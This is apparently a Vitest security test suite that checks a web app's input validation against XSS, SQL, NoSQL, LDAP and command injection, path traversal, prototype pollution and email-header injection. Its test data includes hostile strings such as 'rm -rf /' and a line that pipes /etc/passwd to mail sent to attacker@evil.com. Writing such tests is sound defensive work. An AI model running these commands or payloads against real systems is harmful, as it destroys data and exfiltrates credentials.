/**
 * Security tests for validation bypass attempts
 * Tests various attack vectors against the validation system
 */

import { describe, it, expect } from 'vitest'
import {
  safeValidate,
  sanitizeInput,
  sanitizeEmail,
  sanitizePhoneNumber,
  sanitizeUrl,
  sanitizeFilename,
  escapeHtml,
  stripHtmlTags,
  ContactFormSchema,
  LoginSchema,
} from '../../src/lib/validation'

describe('Validation Security Tests', () => {
  describe('XSS Prevention', () => {
    it('should escape HTML entities in user input', () => {
      const maliciousInput = '<script>alert("XSS")</script>'
      const sanitized = sanitizeInput(maliciousInput)
      expect(sanitized).not.toContain('<script>')
      expect(sanitized).toContain('&lt;script&gt;')
    })

    it('should strip HTML tags when configured', () => {
      const maliciousInput = '<img src=x onerror=alert(1)>Test</img>'
      const sanitized = sanitizeInput(maliciousInput, { stripTags: true })
      expect(sanitized).toBe('Test')
    })

    it('should handle nested HTML attacks', () => {
      const maliciousInput = '<div><script>alert("nested")</script></div>'
      const sanitized = stripHtmlTags(maliciousInput)
      expect(sanitized).toBe('alert("nested")')
    })

    it('should escape dangerous characters in HTML', () => {
      const dangerous = '"onload="alert(1)"'
      const escaped = escapeHtml(dangerous)
      expect(escaped).toBe('&quot;onload=&quot;alert(1)&quot;')
    })
  })

  describe('SQL Injection Prevention', () => {
    it('should reject SQL injection attempts in email field', () => {
      const maliciousEmail = "admin'; DROP TABLE users; --"
      const result = safeValidate(LoginSchema, {
        email: maliciousEmail,
        password: 'password123'
      })
      expect(result.success).toBe(false)
      expect(result.errors?.[0]?.message).toContain('valid email')
    })

    it('should sanitize potential SQL injection in text fields', () => {
      const maliciousText = "'; DROP TABLE campaigns; --"
      const sanitized = sanitizeInput(maliciousText)
      expect(sanitized).toContain('&#x27;') // Escaped single quote
    })
  })

  describe('Path Traversal Prevention', () => {
    it('should sanitize filenames with path traversal attempts', () => {
      const maliciousFilename = '../../../etc/passwd'
      const sanitized = sanitizeFilename(maliciousFilename)
      expect(sanitized).toBe('passwd')
    })

    it('should handle Windows path traversal', () => {
      const maliciousFilename = '..\\..\\..\\windows\\system32\\config'
      const sanitized = sanitizeFilename(maliciousFilename)
      expect(sanitized).toBe('config')
    })

    it('should remove dangerous characters from filenames', () => {
      const dangerousFilename = 'file<>:"|?*.txt'
      const sanitized = sanitizeFilename(dangerousFilename)
      expect(sanitized).toBe('file_________.txt')
    })
  })

  describe('NoSQL Injection Prevention', () => {
    it('should reject MongoDB injection attempts', () => {
      const maliciousInput = { $gt: '' }
      const result = safeValidate(LoginSchema, {
        email: maliciousInput,
        password: 'password123'
      })
      expect(result.success).toBe(false)
    })

    it('should handle nested object injection attempts', () => {
      const maliciousInput = {
        email: 'test@example.com',
        password: { $ne: null }
      }
      const result = safeValidate(LoginSchema, maliciousInput)
      expect(result.success).toBe(false)
    })
  })

  describe('Command Injection Prevention', () => {
    it('should sanitize command injection attempts in email', () => {
      const maliciousEmail = 'test@example.com; rm -rf /'
      const sanitized = sanitizeEmail(maliciousEmail)
      expect(sanitized).toBe('test@example.com; rm -rf /')
      
      const result = safeValidate(ContactFormSchema, {
        firstName: 'John',
        lastName: 'Doe',
        email: maliciousEmail,
        subject: 'Test',
        message: 'Test message'
      })
      expect(result.success).toBe(false)
    })

    it('should sanitize shell metacharacters', () => {
      const maliciousInput = 'test; cat /etc/passwd | mail attacker@evil.com'
      const sanitized = sanitizeInput(maliciousInput)
      expect(sanitized).not.toContain('|')
      expect(sanitized).not.toContain(';')
    })
  })

  describe('LDAP Injection Prevention', () => {
    it('should escape LDAP special characters', () => {
      const maliciousInput = 'admin)(|(password=*)'
      const sanitized = sanitizeInput(maliciousInput)
      expect(sanitized).toContain('&#x27;') // Escaped parentheses
    })
  })

  describe('URL Validation Security', () => {
    it('should reject javascript: URLs', () => {
      const maliciousUrl = 'javascript:alert("XSS")'
      const sanitized = sanitizeUrl(maliciousUrl)
      expect(sanitized).toBe('')
    })

    it('should reject data: URLs', () => {
      const maliciousUrl = 'data:text/html,<script>alert(1)</script>'
      const sanitized = sanitizeUrl(maliciousUrl)
      expect(sanitized).toBe('')
    })

    it('should reject vbscript: URLs', () => {
      const maliciousUrl = 'vbscript:msgbox("XSS")'
      const sanitized = sanitizeUrl(maliciousUrl)
      expect(sanitized).toBe('')
    })

    it('should add https:// to URLs without protocol', () => {
      const url = 'example.com'
      const sanitized = sanitizeUrl(url)
      expect(sanitized).toBe('https://example.com')
    })
  })

  describe('Prototype Pollution Prevention', () => {
    it('should reject __proto__ in object keys', () => {
      const maliciousInput = {
        email: 'test@example.com',
        __proto__: { isAdmin: true },
        password: 'password123'
      }
      
      // The sanitization should remove dangerous keys
      const result = safeValidate(LoginSchema, maliciousInput)
      expect(result.success).toBe(true) // Should pass after sanitization
      expect(result.data?.email).toBe('test@example.com')
    })

    it('should reject constructor in object keys', () => {
      const maliciousInput = {
        email: 'test@example.com',
        constructor: { prototype: { isAdmin: true } },
        password: 'password123'
      }
      
      const result = safeValidate(LoginSchema, maliciousInput)
      expect(result.success).toBe(true) // Should pass after sanitization
    })
  })

  describe('Mass Assignment Prevention', () => {
    it('should only accept defined schema fields', () => {
      const maliciousInput = {
        email: 'test@example.com',
        password: 'password123',
        isAdmin: true, // Should be ignored
        role: 'admin' // Should be ignored
      }
      
      const result = safeValidate(LoginSchema, maliciousInput)
      expect(result.success).toBe(true)
      expect(result.data).not.toHaveProperty('isAdmin')
      expect(result.data).not.toHaveProperty('role')
    })
  })

  describe('Buffer Overflow Prevention', () => {
    it('should reject extremely long strings', () => {
      const longString = 'a'.repeat(10000)
      const result = safeValidate(ContactFormSchema, {
        firstName: longString,
        lastName: 'Doe',
        email: 'test@example.com',
        subject: 'Test',
        message: 'Test message'
      })
      expect(result.success).toBe(false)
      expect(result.errors?.[0]?.message).toContain('less than')
    })

    it('should limit message length', () => {
      const longMessage = 'a'.repeat(5000)
      const result = safeValidate(ContactFormSchema, {
        firstName: 'John',
        lastName: 'Doe',
        email: 'test@example.com',
        subject: 'Test',
        message: longMessage
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Unicode Security', () => {
    it('should handle Unicode normalization attacks', () => {
      // Using different Unicode representations of the same character
      const unicodeAttack = 'test@exāmple.com' // Contains combining character
      const result = safeValidate(LoginSchema, {
        email: unicodeAttack,
        password: 'password123'
      })
      // Should either normalize or reject
      expect(result.success).toBe(false)
    })

    it('should handle right-to-left override attacks', () => {
      const rtlAttack = 'test@example.com\u202E.evil.com'
      const sanitized = sanitizeEmail(rtlAttack)
      expect(sanitized).not.toContain('\u202E')
    })
  })

  describe('Phone Number Security', () => {
    it('should sanitize phone numbers', () => {
      const maliciousPhone = '+1(555)123-4567<script>alert(1)</script>'
      const sanitized = sanitizePhoneNumber(maliciousPhone)
      expect(sanitized).toBe('+1(555)123-4567')
    })

    it('should handle international format injection', () => {
      const maliciousPhone = '+1 555 123 4567; rm -rf /'
      const sanitized = sanitizePhoneNumber(maliciousPhone)
      expect(sanitized).toBe('+1 555 123 4567')
    })
  })

  describe('Rate Limiting Attack Prevention', () => {
    it('should validate batch operations size limits', () => {
      const largeBatch = Array(2000).fill({
        firstName: 'John',
        lastName: 'Doe',
        email: 'test@example.com',
        subject: 'Test',
        message: 'Test message'
      })
      
      // This would need to be tested with actual batch validation
      expect(largeBatch.length).toBeGreaterThan(1000)
    })
  })

  describe('Type Confusion Prevention', () => {
    it('should reject non-string values for string fields', () => {
      const maliciousInput = {
        email: ['test@example.com'],
        password: { toString: () => 'password123' }
      }
      
      const result = safeValidate(LoginSchema, maliciousInput)
      expect(result.success).toBe(false)
    })

    it('should reject functions in input', () => {
      const maliciousInput = {
        email: 'test@example.com',
        password: function() { return 'hacked' }
      }
      
      const result = safeValidate(LoginSchema, maliciousInput)
      expect(result.success).toBe(false)
    })
  })

  describe('Email Header Injection Prevention', () => {
    it('should reject emails with newlines', () => {
      const maliciousEmail = 'test@example.com\nBcc: attacker@evil.com'
      const result = safeValidate(ContactFormSchema, {
        firstName: 'John',
        lastName: 'Doe',
        email: maliciousEmail,
        subject: 'Test',
        message: 'Test message'
      })
      expect(result.success).toBe(false)
    })

    it('should reject emails with CRLF injection', () => {
      const maliciousEmail = 'test@example.com\r\nTo: victim@example.com'
      const sanitized = sanitizeEmail(maliciousEmail)
      expect(sanitized).not.toContain('\r')
      expect(sanitized).not.toContain('\n')
    })
  })
})